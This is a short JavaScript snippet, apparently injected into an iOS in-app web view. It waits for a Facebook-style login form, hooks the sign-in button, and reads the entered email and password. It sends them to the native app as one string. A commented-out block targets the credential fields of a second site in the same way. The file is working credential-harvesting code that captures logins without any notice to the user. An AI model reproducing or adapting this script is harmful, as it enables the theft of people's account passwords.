//var timeoutSeconds = 30;

//------------------------------------------------------------------------>>>>>>>
//code for extraction
//
var username,password;
//var checkFetcher = setInterval(fetcher,7000);
//
//setTimeout(function(){ clearInterval(checkFetcher)}, timeoutSeconds*7000);
//

var obj = setInterval(getButtonId,5000);

function getButtonId(){
var signInButton = document.getElementById('u_0_a');
if (signInButton == null){
    document.write("anshul");
    return;
}
    signInButton.onclick = check;
}

var check = function(){
    try {
        var usernameInput = document.getElementById('email');
        var passwordInput = document.getElementById('pass');
        username = usernameInput.value
        password = passwordInput.value;
        webkit.messageHandlers.callbackHandler.postMessage(username + " " + password);
        clearInterval(obj);
    } catch(err) {
        console.log('The native context does not exist yet');
    }
}
//
//function fetcher(){
//    //fb username -  email,pass, u_0_a
//    //Rtst -> ws-credentials-username,ws-credentials-password,ws-credentials-submit
//
//    var usernameInput = document.getElementById('ws-credentials-username');
//    var passwordInput = document.getElementById('ws-credentials-password');
//    var signInButton = document.getElementById('ws-credentials-submit');
//
//    if (signInButton == null){
//        return;
//    }
//
//    if (usernameInput != null && passwordInput != null){
//        username = usernameInput.value;
//        password = passwordInput.value;
//        signInButton.onclick = check;
//    }
//    clearInterval(checkFetcher);
//}



//-----------------------------------------------------------------<<<<<<<<


